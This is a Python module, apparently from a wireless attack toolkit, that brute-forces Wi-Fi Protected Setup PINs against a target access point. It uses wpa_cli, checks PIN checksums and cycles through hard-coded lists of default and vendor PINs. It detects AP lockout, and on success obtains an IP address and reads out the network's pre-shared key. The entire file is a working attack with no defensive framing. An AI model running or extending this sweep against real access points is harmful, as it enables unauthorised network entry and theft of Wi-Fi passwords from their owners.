"""wps.py - WPS PIN sweep engine (single implementation; profiles select PINs).

WPS PINs are 8 decimal digits with a checksum in the last digit. This module
VALIDATES every PIN before use: rounds 1-3 of this project silently skipped
most PINs on local checksum failure, so validation + reporting is mandatory.

Stock radio cannot run reaver/pixie (no monitor mode): only whole-PIN
enrollment via wpa_cli is possible, with AP-lockout detection.
"""
import re
import time
from .. import config
from ..radio import wpa_cli, run


def checksum_digit(pin7):
    s = sum(int(d) * (3 if i % 2 == 0 else 1) for i, d in enumerate(pin7))
    return str((10 - s % 10) % 10)


def valid_pin(pin):
    return (isinstance(pin, str) and len(pin) == 8 and pin.isdigit()
            and pin[7] == checksum_digit(pin[:7]))


PIN_DEFAULTS = ["12345670", "00000000", "11111115", "22222220", "33333335",
                "44444440", "55555555", "66666660", "77777775", "88888880",
                "99999995", "87654325", "20080846", "11223344"]

PIN_VENDOR_GX = ["20172527", "36601790", "76229909", "49804348", "01472653",
                 "28339458", "02763408", "54985780", "71531762", "10000762"]

PIN_EXTENDED = ["00056724", "41896990", "08507716", "12344321", "12456789",
                "23456785", "34567890", "45678905", "56789010", "67890125",
                "78901230", "89012345", "90123450", "01234565", "10203040",
                "11122234", "12341238", "12121212", "13131319", "23232327",
                "45454547", "56565652", "78787872", "89898987", "00001113",
                "11110002", "24681353", "13579241", "06299095", "34720950",
                "96376164", "56619096", "40201825", "81397549", "75296186",
                "88457666", "30575677", "40506012", "08759078", "03928479",
                "12345601", "00012348", "43210008", "55555326", "28296607",
                "22222220", "33333335", "44444440", "55555555", "66666660",
                "77777775", "88888880", "87654325", "20080846", "49804348",
                "01472653", "28339458", "02763408", "54985780", "71531762",
                "10000762", "99999995"]

PROFILES = {"defaults": PIN_DEFAULTS, "vendor": PIN_VENDOR_GX, "extended": PIN_EXTENDED,
            "all": PIN_DEFAULTS + PIN_VENDOR_GX + PIN_EXTENDED}

NEGOTIATING = {"ASSOCIATING", "ASSOCIATED", "4WAY_HANDSHAKE", "GROUP_HANDSHAKE"}


def _networks(ctrl, iface):
    _, out = wpa_cli(ctrl, iface, "list_networks")
    return [ln.split("\t")[0] for ln in out.splitlines()[1:] if ln.strip()]


def sweep(bssid, ssid, pins, outdir, log, wait_s=None, max_ignored=None,
          ctrl=config.CTRL_DIR, iface=config.IFACE):
    """Try WPS PINs in order. Returns {'pin'|'reason', ...}.

    log: callable(msg) for progress lines. Stale networks are cleaned per PIN.
    Aborts early with reason='locked' if the AP stops negotiating.
    """
    import os
    wait_s = config.WPS_WAIT_S if wait_s is None else wait_s
    max_ignored = config.WPS_MAX_IGNORED if max_ignored is None else max_ignored
    os.makedirs(outdir, exist_ok=True)
    attempted, skipped, ignores = 0, 0, 0
    for pin in pins:
        if not valid_pin(pin):
            skipped += 1
            log(f"[skip] {pin}: bad checksum, never sent")
            continue
        old = set(_networks(ctrl, iface))
        log(f"[*] trying PIN {pin} ...")
        _, resp = wpa_cli(ctrl, iface, "wps_pin", bssid, pin)
        if re.search(r"fail", resp, re.I):
            skipped += 1
            log(f"[skip] {pin}: rejected locally ({resp.strip()[:80]})")
            continue
        attempted += 1
        negotiated, done = False, False
        deadline = time.time() + wait_s
        while time.time() < deadline:
            _, st = wpa_cli(ctrl, iface, "status")
            m = re.search(r"wpa_state=(\S+)", st)
            state = m.group(1) if m else ""
            if state == "COMPLETED":
                done = True
                break
            if state in NEGOTIATING:
                negotiated = True
            time.sleep(2)
        if done:
            run(["dhcpcd", "--timeout", str(config.DHCP_TIMEOUT_S), iface], timeout=20)
            time.sleep(2)
            _, ipout = run(["ip", "-4", "-o", "addr", "show", iface], 10)
            m = re.search(r"inet (\S+)", ipout)
            ip = m.group(1) if m else ""
            nets = _networks(ctrl, iface)
            psk = ""
            if nets:
                _, psk = wpa_cli(ctrl, iface, "get_network", nets[-1], "psk")
            return {"pin": pin, "psk": psk.strip(), "ip": ip,
                    "attempted": attempted, "skipped": skipped}
        for n in set(_networks(ctrl, iface)) - old:
            wpa_cli(ctrl, iface, "remove_network", n)
        wpa_cli(ctrl, iface, "wps_cancel")
        if not negotiated:
            ignores += 1
            log(f"[!] AP ignored PIN {pin} ({ignores} in a row) - possible lockout")
            if ignores >= max_ignored:
                return {"reason": "locked", "attempted": attempted, "skipped": skipped}
        else:
            ignores = 0
            log(f"[ ] PIN {pin} failed (AP negotiated, PIN wrong)")
    return {"reason": "exhausted", "attempted": attempted, "skipped": skipped}
